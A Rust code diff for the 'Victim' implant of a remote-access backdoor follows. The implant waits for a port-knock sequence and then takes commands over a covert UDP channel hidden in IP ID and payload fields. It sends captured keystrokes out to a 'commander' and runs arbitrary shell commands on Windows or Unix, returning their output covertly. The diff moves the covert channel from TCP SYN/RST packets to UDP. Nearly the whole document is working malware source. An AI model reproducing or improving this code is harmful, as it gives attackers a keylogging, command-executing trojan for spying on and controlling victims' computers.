@@ -1,4 +1,4 @@
-use std::net::{IpAddr, Ipv4Addr, TcpListener};
+use std::net::{IpAddr, Ipv4Addr};
 use std::sync::mpsc::{self, Receiver, Sender};
 use std::thread;
 use std::time::Duration;
@@ -8,13 +8,13 @@ use pnet::packet::Packet;
 use pnet::transport::{transport_channel, TransportChannelType::Layer3, TransportSender, TransportReceiver};
 use pnet::packet::ip::IpNextHeaderProtocols;
 use pnet::datalink::{self, NetworkInterface};
-use crate::covert;
 
+mod covert;
 mod keylogger;
 mod port_knkr;
 
 use keylogger::Control as KeylogControl;
-use crate::port_knkr::{SimpleRng, generate_seed};
+use port_knkr::{SimpleRng, generate_seed};
 
 const CMD_START_LOGGER:   u8 = 0x10;
 const CMD_STOP_LOGGER:    u8 = 0x20;
@@ -56,17 +56,17 @@ impl Victim {
         let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
 
         loop {
+            // Re-generate seed based on current time to match commander
             let seed = generate_seed(&self.local_ip, 0);
             let mut rng = SimpleRng::new(seed);
             let knocks = [rng.gen_port(), rng.gen_port(), rng.gen_port()];
-            let tx_p = rng.gen_port();
-            let rx_p = rng.gen_port();
+            let tx_p = rng.gen_port(); // Victim listens here
+            let rx_p = rng.gen_port(); // Commander listens here
 
             if let Ok((packet, _)) = rx_iter.next() {
                 let source_ip = packet.get_source();
                 if let Some(tcp) = TcpPacket::new(packet.payload()) {
                     if tcp.get_destination() == knocks[0] {
-                        // Potential knock started
                         let mut knock_count = 1;
                         let start = std::time::Instant::now();
                         
@@ -81,7 +81,7 @@ impl Victim {
                         }
 
                         if knock_count == 3 {
-                            println!("[+] Knock verified! Target Ports -> Listener: {}, Reply: {}", tx_p, rx_p);
+                            println!("[+] Knock verified! Listening on port {}, Replying to {}", tx_p, rx_p);
                             return (source_ip, tx_p, rx_p);
                         }
                     }
@@ -93,57 +93,50 @@ impl Victim {
     pub fn run(&mut self) {
         let (commander_ip, my_port, cmd_port) = self.wait_for_commander();
 
-        println!("[*] Entering RAW handshake mode on port {}", my_port);
+        let protocol = Layer3(IpNextHeaderProtocols::Udp);
+        let (tx, rx) = transport_channel(65535, protocol).unwrap();
+        
+        self.main_loop(tx, rx, commander_ip, my_port, cmd_port);
+    }
 
-        let protocol = Layer3(IpNextHeaderProtocols::Tcp);
-        let (mut tx, mut rx) = transport_channel(4096, protocol).unwrap();
-        let mut packet_iter = pnet::transport::ipv4_packet_iter(&mut rx);
+    fn main_loop(&mut self, mut tx: TransportSender, mut rx: TransportReceiver, commander_ip: Ipv4Addr, my_port: u16, cmd_port: u16) {
+        let mut receiver_state = covert::ReceiverState::new();
+        let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
 
         loop {
-            if let Ok((packet, _)) = packet_iter.next() {
-
-                if packet.get_source() != commander_ip {
-                    continue;
+            // Check for keylog data to send back to commander
+            if let Some(ref rx_chan) = self.keylog_data_rx {
+                while let Ok(line) = rx_chan.try_recv() {
+                    self.send_covert_response(line.as_bytes(), &mut tx, commander_ip, my_port, cmd_port);
                 }
+            }
 
-                if let Some(tcp) = TcpPacket::new(packet.payload()) {
+            // Sniff for incoming commands from commander
+            if let Ok((packet, _)) = rx_iter.next() {
+                if packet.get_source() != commander_ip { continue; }
 
-                    if tcp.get_destination() == my_port &&
-                       tcp.get_flags() & pnet::packet::tcp::TcpFlags::SYN != 0 {
+                if let Some(parsed) = covert::parse_udp_data_from_ipv4(packet.packet()) {
+                    if parsed.dst_port == my_port {
+                        let unmasked = covert::unmask_word(parsed.masked_word, parsed.ip_id);
+                        if let Ok((_action, sig_id)) = receiver_state.apply_chunk(parsed.ip_id, unmasked) {
+                            
+                            // Send ACK Signature via IP ID
+                            let ack_params = covert::UdpAckParams {
+                                src_ip: self.local_ip,
+                                dst_ip: commander_ip,
+                                src_port: my_port,
+                                dst_port: parsed.src_port,
+                                ip_id_signature: sig_id,
+                            };
 
-                        println!("[+] SYN received from {}", commander_ip);
+                            let ack_pkt = covert::build_udp_ack_packet(&ack_params);
+                            let _ = tx.send_to(pnet::packet::ipv4::Ipv4Packet::new(&ack_pkt).unwrap(), IpAddr::V4(commander_ip));
 
-                        let client_seq = tcp.get_sequence();
-                        let server_seq: u32 = 0x1337;
-
-                        // Build SYN-ACK
-                        let syn_ack = covert::build_syn_ack_packet(
-                            self.local_ip,
-                            commander_ip,
-                            my_port,
-                            tcp.get_source(),
-                            server_seq,
-                            client_seq.wrapping_add(1),
-                        );
-
-                        let _ = tx.send_to(
-                            pnet::packet::ipv4::Ipv4Packet::new(&syn_ack).unwrap(),
-                            IpAddr::V4(commander_ip)
-                        );
-
-                        println!("[+] SYN-ACK sent");
-
-                        // Wait for final ACK
-                        while let Ok((ack_pkt, _)) = packet_iter.next() {
-                            if let Some(ack_tcp) = TcpPacket::new(ack_pkt.payload()) {
-                                if ack_tcp.get_destination() == my_port &&
-                                   ack_tcp.get_flags() & pnet::packet::tcp::TcpFlags::ACK != 0 &&
-                                   ack_tcp.get_acknowledgement() == server_seq.wrapping_add(1) {
-
-                                    println!("[+] Raw handshake complete");
-                                    self.main_loop(tx, rx, commander_ip, my_port, cmd_port);
-                                    return;
+                            if receiver_state.complete {
+                                if let Ok(cmd_str) = receiver_state.message_str() {
+                                    self.handle_command(&cmd_str, &mut tx, commander_ip, my_port, cmd_port);
                                 }
+                                receiver_state = covert::ReceiverState::new();
                             }
                         }
                     }
@@ -152,40 +145,24 @@ impl Victim {
         }
     }
 
-    fn main_loop(&mut self, mut tx: TransportSender, mut rx: TransportReceiver, commander_ip: Ipv4Addr, my_port: u16, cmd_port: u16) {
-        let mut receiver_state = covert::ReceiverState::new();
+    fn send_covert_response(&self, data: &[u8], tx: &mut TransportSender, dst_ip: Ipv4Addr, src_port: u16, dst_port: u16) {
+        let mut state = covert::SenderState::new_from_bytes(data);
+        let protocol = Layer3(IpNextHeaderProtocols::Udp);
+        let (_, mut rx) = transport_channel(65535, protocol).unwrap();
         let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
 
-        loop {
-            if let Some(ref rx_chan) = self.keylog_data_rx {
-                while let Ok(line) = rx_chan.try_recv() {
-                    self.send_covert_response(line.as_bytes(), &mut tx, commander_ip, my_port, cmd_port);
-                }
-            }
-
-            if let Ok((packet, _)) = rx_iter.next() {
-                if packet.get_source() != commander_ip { continue; }
-
-                if let Some(parsed) = covert::parse_syn_from_ipv4_packet(packet.packet()) {
-                    if parsed.dst_port == my_port {
-                        if let Ok((_, sig_id)) = receiver_state.apply_chunk(parsed.ip_id, parsed.seq) {
-                            let rst_params = covert::RstAckParams {
-                                src_ip: self.local_ip,
-                                dst_ip: commander_ip,
-                                src_port: my_port,
-                                dst_port: parsed.src_port,
-                                ack_number: parsed.seq.wrapping_add(1),
-                                ip_id: sig_id,
-                            };
-
-                            let rst_pkt = covert::build_rst_ack_packet(&rst_params);
-                            let _ = tx.send_to(pnet::packet::ipv4::Ipv4Packet::new(&rst_pkt).unwrap(), IpAddr::V4(commander_ip));
-
-                            if receiver_state.complete {
-                                if let Ok(cmd_str) = receiver_state.message_str() {
-                                    self.handle_command(&cmd_str, &mut tx, commander_ip, my_port, cmd_port);
-                                }
-                                receiver_state = covert::ReceiverState::new();
+        while state.has_next() {
+            if let Some((ip_id, raw_word, masked_word)) = state.chunk_to_send() {
+                let udp_pkt = covert::build_udp_sender_packet(self.local_ip, dst_ip, src_port, dst_port, ip_id, masked_word);
+                let _ = tx.send_to(pnet::packet::ipv4::Ipv4Packet::new(&udp_pkt).unwrap(), IpAddr::V4(dst_ip));
+                
+                let start = std::time::Instant::now();
+                while start.elapsed() < Duration::from_millis(800) {
+                    if let Ok((packet, _)) = rx_iter.next() {
+                        if let Some(recv_sig) = covert::parse_udp_ack_signature(packet.packet()) {
+                            if recv_sig == covert::signature_ip_id(ip_id, raw_word) {
+                                state.ack();
+                                break;
                             }
                         }
                     }
@@ -203,32 +180,6 @@ impl Victim {
             CMD_REQUEST_KEYLOG => self.send_keylog_file(tx, cmd_ip, my_port, cmd_port),
             CMD_UNINSTALL => std::process::exit(0),
             _ => self.execute_shell(cmd, tx, cmd_ip, my_port, cmd_port),
-        }
-    }
-
-    fn send_covert_response(&self, data: &[u8], tx: &mut TransportSender, dst_ip: Ipv4Addr, src_port: u16, dst_port: u16) {
-        let mut state = covert::SenderState::new_from_bytes(data);
-        let protocol = Layer3(IpNextHeaderProtocols::Tcp);
-        let (_, mut rx) = transport_channel(65535, protocol).unwrap();
-        let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
-
-        while state.has_next() {
-            if let Some((ip_id, raw_word, masked_seq)) = state.chunk_to_send() {
-                let syn_pkt = covert::build_syn_packet(self.local_ip, dst_ip, src_port, dst_port, ip_id, masked_seq);
-                let _ = tx.send_to(pnet::packet::ipv4::Ipv4Packet::new(&syn_pkt).unwrap(), IpAddr::V4(dst_ip));
-                
-                let start = std::time::Instant::now();
-                while start.elapsed() < Duration::from_millis(800) {
-                    if let Ok((packet, _)) = rx_iter.next() {
-                        if let Some(recv_id) = covert::parse_rst_ack_signature(packet.packet()) {
-                            if recv_id == covert::signature_ip_id(ip_id, raw_word) {
-                                state.ack();
-                                break;
-                            }
-                        }
-                    }
-                }
-            }
         }
     }
 
@@ -252,8 +203,12 @@ impl Victim {
     }
 
     fn execute_shell(&self, cmd: &str, tx: &mut TransportSender, dst_ip: Ipv4Addr, src_port: u16, dst_port: u16) {
-        if let Ok(output) = Command::new("sh").arg("-c").arg(cmd).output() {
+        let shell = if cfg!(target_os = "windows") { "cmd" } else { "sh" };
+        let flag = if cfg!(target_os = "windows") { "/C" } else { "-c" };
+        
+        if let Ok(output) = Command::new(shell).arg(flag).arg(cmd).output() {
             self.send_covert_response(&output.stdout, tx, dst_ip, src_port, dst_port);
+            self.send_covert_response(&output.stderr, tx, dst_ip, src_port, dst_port);
         }
     }
 }
